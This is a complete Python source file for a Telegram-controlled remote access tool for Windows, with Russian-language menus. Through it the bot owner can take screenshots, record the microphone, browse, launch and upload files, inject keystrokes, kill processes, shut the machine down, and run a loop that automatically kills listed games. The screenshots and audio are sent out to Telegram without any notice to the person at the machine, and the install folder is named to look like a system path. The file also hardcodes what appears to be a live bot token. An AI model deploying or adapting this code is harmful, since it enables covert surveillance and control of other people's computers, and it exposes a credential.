import os
import psutil
import ctypes
import mss
import asyncio
import socket
import sounddevice as sd
from scipy.io.wavfile import write
import requests
import threading
import time
import sys
import random
import subprocess
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from pynput.keyboard import Controller, Key
from telegram.error import BadRequest

TOKEN = "8625083421:AAG_E9w1gZTJ2EnD5GU6SgsjYUM15hF9gLI"
OWNER_ID = 8364451852
CURRENT_PATH = r"C:\WindowsPy"
DOWNLOAD_FOLDER = os.path.join(CURRENT_PATH, "downloads")
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
keyboard_controller = Controller()
pressed_keys = {}

NO_GAMES_MODE = False
NO_GAMES_THREAD = None
KILLED_PROCESSES = []

GAME_PROCESSES = [
    "Raft.exe", "Raft",
    "Rust.exe", "RustClient.exe", "Rust",
    "GTA5.exe", "GTAV.exe", "Grand Theft Auto V.exe",
    "Bannerlord.exe", "Mount & Blade II Bannerlord.exe",
    "Terraria.exe", "Terraria",
    "tModLoader.exe", "tModLoader",
    "payday2.exe", "PAYDAY2.exe",
    "ScrapMechanic.exe", "Scrap Mechanic.exe",
    "Borderlands2.exe", "Borderlands 2.exe",
    "Skyrim.exe", "SkyrimSE.exe", "TESV.exe"
]

def start_no_games():
    global NO_GAMES_MODE, NO_GAMES_THREAD, KILLED_PROCESSES
    NO_GAMES_MODE = True
    KILLED_PROCESSES = []
    NO_GAMES_THREAD = threading.Thread(target=no_games_loop, daemon=True)
    NO_GAMES_THREAD.start()

def stop_no_games():
    global NO_GAMES_MODE
    NO_GAMES_MODE = False

def no_games_loop():
    global NO_GAMES_MODE, KILLED_PROCESSES
    while True:
        if NO_GAMES_MODE:
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name']
                    for game in GAME_PROCESSES:
                        if game.lower() in proc_name.lower():
                            try:
                                proc.terminate()
                                time.sleep(0.1)
                                if proc.is_running():
                                    proc.kill()
                                kill_info = f"🔪 {proc_name} [PID:{proc.info['pid']}]"
                                if kill_info not in KILLED_PROCESSES:
                                    KILLED_PROCESSES.append(kill_info)
                            except:
                                pass
                except:
                    continue
        time.sleep(0.3)

def main_menu():
    keyboard = [
        [InlineKeyboardButton("📸 СКРИНШОТ", callback_data="screen")],
        [InlineKeyboardButton("📁 ПРОВОДНИК", callback_data="explorer"), InlineKeyboardButton("📥 ЗАГРУЗИТЬ", callback_data="upload")],
        [InlineKeyboardButton("🎮 ЗАПУСК ИГР", callback_data="games"), InlineKeyboardButton("⚙️ ПРОЦЕССЫ", callback_data="processes")],
        [InlineKeyboardButton("💻 УПРАВЛЕНИЕ", callback_data="power"), InlineKeyboardButton("🌍 IP АДРЕС", callback_data="ip")],
        [InlineKeyboardButton("⌨️ КЛАВИАТУРА", callback_data="keyboard"), InlineKeyboardButton("🎤 МИКРОФОН", callback_data="microphone")],
        [InlineKeyboardButton("💬 ТЕКСТ НА ЭКРАН", callback_data="showtext"), InlineKeyboardButton("🔽 СВЕРНУТЬ ВСЁ", callback_data="minimize_all")],
        [InlineKeyboardButton("🚫 НЕТ ИГРАМ", callback_data="nogames_menu")],
    ]
    return InlineKeyboardMarkup(keyboard)

def back_button(data="main", text="⬅️ НАЗАД"):
    return InlineKeyboardMarkup([[InlineKeyboardButton(text, callback_data=data)]])

def back_to_main():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🏠 ГЛАВНОЕ МЕНЮ", callback_data="main")]])

def mic_menu():
    keyboard = [
        [InlineKeyboardButton("🔴 5 СЕК", callback_data="mic_5"), InlineKeyboardButton("🟠 10 СЕК", callback_data="mic_10")],
        [InlineKeyboardButton("🟡 30 СЕК", callback_data="mic_30"), InlineKeyboardButton("🟢 60 СЕК", callback_data="mic_60")],
        [InlineKeyboardButton("🏠 ГЛАВНОЕ МЕНЮ", callback_data="main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def keyboard_menu():
    keyboard = [
        [InlineKeyboardButton("⬆️ W", callback_data="key_w"), InlineKeyboardButton("⬅️ A", callback_data="key_a"), InlineKeyboardButton("⬇️ S", callback_data="key_s"), InlineKeyboardButton("➡️ D", callback_data="key_d")],
        [InlineKeyboardButton("␣ ПРОБЕЛ", callback_data="key_space"), InlineKeyboardButton("⬆ SHIFT", callback_data="key_shift")],
        [InlineKeyboardButton("⏎ ENTER", callback_data="key_enter"), InlineKeyboardButton("⌫ BACKSPACE", callback_data="key_backspace")],
        [InlineKeyboardButton("↑", callback_data="key_up"), InlineKeyboardButton("↓", callback_data="key_down"), InlineKeyboardButton("←", callback_data="key_left"), InlineKeyboardButton("→", callback_data="key_right")],
        [InlineKeyboardButton("🏠 ГЛАВНОЕ МЕНЮ", callback_data="main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def games_menu():
    keyboard = [
        [InlineKeyboardButton("🎯 CS2", callback_data="cs2"), InlineKeyboardButton("📦 ROBLOX", callback_data="roblox")],
        [InlineKeyboardButton("⛏ TLAUNCHER", callback_data="tlauncher"), InlineKeyboardButton("⚔️ BANNERLORD", callback_data="bannerlord")],
        [InlineKeyboardButton("🌐 CHROME", callback_data="chrome")],
        [InlineKeyboardButton("🏠 ГЛАВНОЕ МЕНЮ", callback_data="main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def power_menu():
    keyboard = [
        [InlineKeyboardButton("⏻ ВЫКЛЮЧИТЬ", callback_data="shutdown"), InlineKeyboardButton("🔄 ПЕРЕЗАГРУЗКА", callback_data="restart")],
        [InlineKeyboardButton("💤 СПЯЧКА", callback_data="sleep"), InlineKeyboardButton("🔒 БЛОКИРОВКА", callback_data="lock")],
        [InlineKeyboardButton("🏠 ГЛАВНОЕ МЕНЮ", callback_data="main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def no_games_menu():
    status = "🟢 АКТИВЕН" if NO_GAMES_MODE else "🔴 ОТКЛЮЧЕН"
    keyboard = [
        [InlineKeyboardButton(f"📊 СТАТУС: {status}", callback_data="nogames_status")],
        [InlineKeyboardButton("🔫 ВКЛЮЧИТЬ", callback_data="nogames_on"), InlineKeyboardButton("🛑 ВЫКЛЮЧИТЬ", callback_data="nogames_off")],
        [InlineKeyboardButton("📋 СПИСОК ИГР", callback_data="nogames_list"), InlineKeyboardButton("📊 ОТЧЁТ", callback_data="nogames_report")],
        [InlineKeyboardButton("🏠 ГЛАВНОЕ МЕНЮ", callback_data="main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def explorer_menu():
    drives = [f"{d}:\\" for d in "CDEF" if os.path.exists(f"{d}:\\")]
    keyboard = []
    for drive in drives:
        keyboard.append([InlineKeyboardButton(f"💾 ДИСК {drive}", callback_data=f"explorer_drive_{drive}")])
    keyboard.append([InlineKeyboardButton("🏠 ГЛАВНОЕ МЕНЮ", callback_data="main")])
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    await update.message.reply_text("🖥 УПРАВЛЕНИЕ ПК", reply_markup=main_menu())

async def show_processes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    procs = []
    for p in psutil.process_iter(['pid', 'name', 'cpu_percent']):
        try:
            pinfo = p.info
            if pinfo['name']:
                procs.append((pinfo['pid'], pinfo['name'], pinfo['cpu_percent'] or 0))
        except:
            continue
    procs.sort(key=lambda x: x[2], reverse=True)
    procs = procs[:20]
    keyboard = []
    row = []
    for pid, name, cpu in procs:
        display_name = name[:12] + '…' if len(name) > 12 else name
        btn_text = f"{display_name} ({cpu:.0f}%)"
        row.append(InlineKeyboardButton(btn_text, callback_data=f"proc_{pid}"))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("🔄 ОБНОВИТЬ", callback_data="processes_refresh")])
    keyboard.append([InlineKeyboardButton("🏠 ГЛАВНОЕ МЕНЮ", callback_data="main")])
    current_time = time.strftime("%H:%M:%S")
    text = f"⚙️ ПРОЦЕССЫ\n🕒 {current_time}"
    try:
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    except BadRequest:
        pass

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except BadRequest:
        pass

    data = query.data

    if data == "main":
        try:
            await query.message.edit_text("🖥 УПРАВЛЕНИЕ ПК", reply_markup=main_menu())
        except BadRequest:
            pass
        return

    elif data == "screen":
        filename = os.path.join(CURRENT_PATH, "temp_screen.png")
        with mss.mss() as sct:
            sct.shot(output=filename)
        with open(filename, "rb") as f:
            await query.message.reply_photo(photo=f)
        os.remove(filename)
        await query.message.edit_text("✅ СКРИНШОТ ГОТОВ", reply_markup=back_to_main())
        return

    elif data == "explorer":
        try:
            await query.message.edit_text("📁 ПРОВОДНИК\n\nВыберите диск:", reply_markup=explorer_menu())
        except BadRequest:
            pass
        return

    elif data.startswith("explorer_drive_"):
        drive = data.replace("explorer_drive_", "")
        context.user_data["current_path"] = drive
        try:
            files = os.listdir(drive)[:20]
        except:
            files = []
        keyboard = []
        for f in files:
            full_path = os.path.join(drive, f)
            if os.path.isdir(full_path):
                btn_text = f"📁 {f}"
                callback = f"explorer_folder_{full_path}"
            else:
                btn_text = f"📄 {f}"
                callback = f"explorer_file_{full_path}"
            keyboard.append([InlineKeyboardButton(btn_text, callback_data=callback)])
        keyboard.append([InlineKeyboardButton("⬅️ НАЗАД", callback_data="explorer")])
        keyboard.append([InlineKeyboardButton("🏠 ГЛАВНОЕ МЕНЮ", callback_data="main")])
        await query.message.edit_text(f"💾 ДИСК {drive}", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    elif data.startswith("explorer_folder_"):
        path = data.replace("explorer_folder_", "")
        context.user_data["current_path"] = path
        try:
            files = os.listdir(path)[:20]
        except:
            files = []
        keyboard = []
        for f in files:
            full_path = os.path.join(path, f)
            if os.path.isdir(full_path):
                btn_text = f"📁 {f}"
                callback = f"explorer_folder_{full_path}"
            else:
                btn_text = f"📄 {f}"
                callback = f"explorer_file_{full_path}"
            keyboard.append([InlineKeyboardButton(btn_text, callback_data=callback)])
        parent = os.path.dirname(path)
        if parent and parent != path:
            keyboard.append([InlineKeyboardButton("⬅️ НАЗАД", callback_data=f"explorer_folder_{parent}")])
        else:
            keyboard.append([InlineKeyboardButton("⬅️ К ДИСКАМ", callback_data="explorer")])
        keyboard.append([InlineKeyboardButton("🏠 ГЛАВНОЕ МЕНЮ", callback_data="main")])
        await query.message.edit_text(f"📁 {path}", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    elif data.startswith("explorer_file_"):
        file_path = data.replace("explorer_file_", "")
        try:
            os.startfile(file_path)
            await query.message.edit_text("✅ ФАЙЛ ЗАПУЩЕН", reply_markup=back_to_main())
        except Exception as e:
            await query.message.edit_text(f"❌ ОШИБКА: {e}", reply_markup=back_to_main())
        return

    elif data == "upload":
        await query.message.edit_text(
            "📥 ЗАГРУЗКА ФАЙЛА\n\nОтправьте файл в этот чат",
            reply_markup=back_to_main()
        )
        return

    elif data == "processes":
        await show_processes(update, context)
        return

    elif data == "processes_refresh":
        await show_processes(update, context)
        return

    elif data.startswith("proc_"):
        pid = int(data.split("_")[1])
        try:
            p = psutil.Process(pid)
            proc_name = p.name()
            proc_cpu = p.cpu_percent()
            proc_memory = p.memory_percent()
            proc_status = p.status()
        except:
            proc_name = "N/A"
            proc_cpu = proc_memory = 0
            proc_status = "N/A"
        text = f"📊 {proc_name}\n🆔 PID: {pid}\n⚡ CPU: {proc_cpu:.1f}%\n💾 RAM: {proc_memory:.1f}%\n🔄 {proc_status}"
        keyboard = [
            [InlineKeyboardButton("❌ ЗАКРЫТЬ", callback_data=f"close_{pid}"), InlineKeyboardButton("💀 УБИТЬ", callback_data=f"kill_{pid}")],
            [InlineKeyboardButton("⬅️ НАЗАД", callback_data="processes")]
        ]
        try:
            await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        except BadRequest:
            pass
        return

    elif data.startswith("close_"):
        pid = int(data.split("_")[1])
        try:
            psutil.Process(pid).terminate()
            await query.message.edit_text("✅ Процесс закрыт", reply_markup=back_button("processes", "⬅️ К ПРОЦЕССАМ"))
        except Exception as e:
            await query.message.edit_text(f"❌ {e}", reply_markup=back_button("processes", "⬅️ К ПРОЦЕССАМ"))
        return

    elif data.startswith("kill_"):
        pid = int(data.split("_")[1])
        try:
            psutil.Process(pid).kill()
            await query.message.edit_text("💀 Процесс УБИТ", reply_markup=back_button("processes", "⬅️ К ПРОЦЕССАМ"))
        except Exception as e:
            await query.message.edit_text(f"❌ {e}", reply_markup=back_button("processes", "⬅️ К ПРОЦЕССАМ"))
        return

    elif data == "games":
        try:
            await query.message.edit_text("🎮 ЗАПУСК ИГР", reply_markup=games_menu())
        except BadRequest:
            pass
        return

    elif data in ["cs2", "roblox", "tlauncher", "bannerlord", "chrome"]:
        paths = {
            "cs2": r"C:\Steam\steamapps\common\Counter-Strike Global Offensive\game\bin\win64\cs2.exe",
            "roblox": r"C:\Users\USER\AppData\Local\Roblox\RobloxPlayerLauncher.exe",
            "tlauncher": r"C:\TLauncher\TLauncher.exe",
            "bannerlord": r"D:\Games\Mount & Blade II Bannerlord\Bannerlord.exe",
            "chrome": r"C:\Program Files\Google\Chrome\Application\chrome.exe"
        }
        try:
            os.startfile(paths[data])
            await query.message.edit_text(f"✅ {data.upper()} ЗАПУЩЕН", reply_markup=back_button("games", "⬅️ К ИГРАМ"))
        except Exception as e:
            await query.message.edit_text(f"❌ {e}", reply_markup=back_button("games", "⬅️ К ИГРАМ"))
        return

    elif data == "power":
        try:
            await query.message.edit_text("💻 УПРАВЛЕНИЕ ПК", reply_markup=power_menu())
        except BadRequest:
            pass
        return

    elif data == "shutdown":
        await query.message.edit_text("⏻ ВЫКЛЮЧЕНИЕ ЧЕРЕЗ 5 СЕК")
        os.system("shutdown /s /t 5")
        return

    elif data == "restart":
        await query.message.edit_text("🔄 ПЕРЕЗАГРУЗКА ЧЕРЕЗ 5 СЕК")
        os.system("shutdown /r /t 5")
        return

    elif data == "sleep":
        ctypes.windll.powrprof.SetSuspendState(0, 1, 0)
        return

    elif data == "lock":
        ctypes.windll.user32.LockWorkStation()
        await query.message.edit_text("🔒 ПК ЗАБЛОКИРОВАН", reply_markup=back_to_main())
        return

    elif data == "ip":
        local_ip = socket.gethostbyname(socket.gethostname())
        try:
            external_ip = requests.get("https://api.ipify.org").text
        except:
            external_ip = "❌ НЕ ДОСТУПЕН"
        text = f"🌍 IP АДРЕСА\n═══════════════\n🏠 ЛОКАЛЬНЫЙ: {local_ip}\n🌐 ВНЕШНИЙ: {external_ip}"
        try:
            await query.message.edit_text(text, reply_markup=back_to_main())
        except BadRequest:
            pass
        return

    elif data == "keyboard":
        try:
            await query.message.edit_text("⌨️ КЛАВИАТУРА", reply_markup=keyboard_menu())
        except BadRequest:
            pass
        return

    elif data.startswith("key_"):
        key_name = data[4:]
        key_mapping = {
            "w": "w", "a": "a", "s": "s", "d": "d",
            "space": Key.space, "shift": Key.shift,
            "enter": Key.enter, "backspace": Key.backspace,
            "up": Key.up, "down": Key.down, "left": Key.left, "right": Key.right
        }
        key = key_mapping.get(key_name)
        if not key:
            return
        keyboard_controller.press(key)
        time.sleep(0.1)
        keyboard_controller.release(key)
        await query.answer(f"✅ {key_name.upper()} НАЖАТА")
        return

    elif data == "microphone":
        try:
            await query.message.edit_text("🎤 МИКРОФОН\n\nВыберите длительность:", reply_markup=mic_menu())
        except BadRequest:
            pass
        return

    elif data.startswith("mic_"):
        seconds = int(data.split("_")[1])
        filename = "mic_record.wav"
        fs = 44100
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
        for i in range(seconds, 0, -1):
            progress = "█" * (seconds - i) + "░" * i
            try:
                await query.message.edit_text(f"🎤 ЗАПИСЬ... {i} СЕК\n{progress}", reply_markup=None)
            except BadRequest:
                pass
            await asyncio.sleep(1)
        sd.wait()
        write(filename, fs, recording)
        with open(filename, "rb") as f:
            await query.message.reply_voice(f)
        os.remove(filename)
        try:
            await query.message.edit_text("✅ ЗАПИСЬ ОТПРАВЛЕНА", reply_markup=back_to_main())
        except BadRequest:
            pass
        return

    elif data == "showtext":
        context.user_data["awaiting_text"] = True
        await query.message.edit_text(
            "💬 ТЕКСТ НА ЭКРАН\n\nНапишите текст для отображения\nили нажмите кнопку назад.",
            reply_markup=back_button("main", "⬅️ ОТМЕНА")
        )
        return

    elif data == "minimize_all":
        try:
            keyboard_controller.press(Key.cmd_l)
            keyboard_controller.press('d')
            time.sleep(0.1)
            keyboard_controller.release('d')
            keyboard_controller.release(Key.cmd_l)
            await query.answer("✅ ВСЁ СВЕРНУТО")
        except Exception as e:
            await query.answer(f"❌ {str(e)}")
        return

    elif data == "nogames_menu":
        status = "🟢 АКТИВЕН" if NO_GAMES_MODE else "🔴 ОТКЛЮЧЕН"
        text = f"🚫 НЕТ ИГРАМ\n═══════════════\n📊 СТАТУС: {status}\n🎮 ИГР В СПИСКЕ: {len(GAME_PROCESSES)}\n💀 УБИТО: {len(KILLED_PROCESSES)}"
        try:
            await query.message.edit_text(text, reply_markup=no_games_menu())
        except BadRequest:
            pass
        return

    elif data == "nogames_on":
        if not NO_GAMES_MODE:
            start_no_games()
            await query.message.edit_text(
                "🚫 РЕЖИМ АКТИВИРОВАН\n\nВсе игры из списка будут уничтожены при запуске",
                reply_markup=back_button("nogames_menu", "⬅️ НАЗАД")
            )
        else:
            await query.answer("⚠️ УЖЕ ВКЛЮЧЕНО", show_alert=True)
        return

    elif data == "nogames_off":
        if NO_GAMES_MODE:
            stop_no_games()
            await query.message.edit_text(
                f"🛑 РЕЖИМ ОТКЛЮЧЕН\n\n💀 УБИТО: {len(KILLED_PROCESSES)}",
                reply_markup=back_button("nogames_menu", "⬅️ НАЗАД")
            )
        else:
            await query.answer("⚠️ УЖЕ ВЫКЛЮЧЕНО", show_alert=True)
        return

    elif data == "nogames_list":
        game_list = "\n".join([f"• {game}" for game in GAME_PROCESSES[:15]])
        if len(GAME_PROCESSES) > 15:
            game_list += f"\n• ...И ЕЩЁ {len(GAME_PROCESSES)-15}"
        await query.message.edit_text(
            f"📋 СПИСОК ИГР:\n\n{game_list}",
            reply_markup=back_button("nogames_menu", "⬅️ НАЗАД")
        )
        return

    elif data == "nogames_report":
        if KILLED_PROCESSES:
            report = "\n".join(KILLED_PROCESSES[-10:])
            if len(KILLED_PROCESSES) > 10:
                report += f"\n\n...И ЕЩЁ {len(KILLED_PROCESSES)-10}"
        else:
            report = "📭 ПОКА НИКОГО НЕ УБИТО"
        await query.message.edit_text(
            f"📊 ОТЧЁТ:\n\n{report}",
            reply_markup=back_button("nogames_menu", "⬅️ НАЗАД")
        )
        return

    elif data == "nogames_status":
        await query.answer(f"📊 СТАТУС: {'АКТИВЕН' if NO_GAMES_MODE else 'ОТКЛЮЧЕН'}", show_alert=True)
        return

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    if context.user_data.get("awaiting_text"):
        text = update.message.text
        try:
            ctypes.windll.user32.MessageBoxW(0, text, "💬 Сообщение", 0)
            await update.message.reply_text("✅ ТЕКСТ ОТОБРАЖЁН", reply_markup=back_to_main())
        except Exception as e:
            await update.message.reply_text(f"❌ ОШИБКА: {e}", reply_markup=back_to_main())
        finally:
            context.user_data["awaiting_text"] = False
        return

async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    file = await update.message.document.get_file()
    path = os.path.join(DOWNLOAD_FOLDER, update.message.document.file_name)
    await file.download_to_drive(path)
    try:
        await update.message.reply_text(f"✅ ФАЙЛ СОХРАНЁН", reply_markup=back_to_main())
    except BadRequest:
        pass

async def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
    await app.initialize()
    await app.start()
    await app.bot.send_message(chat_id=OWNER_ID, text="🟢 ПК ВКЛЮЧЁН")
    await app.updater.start_polling()
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(main())
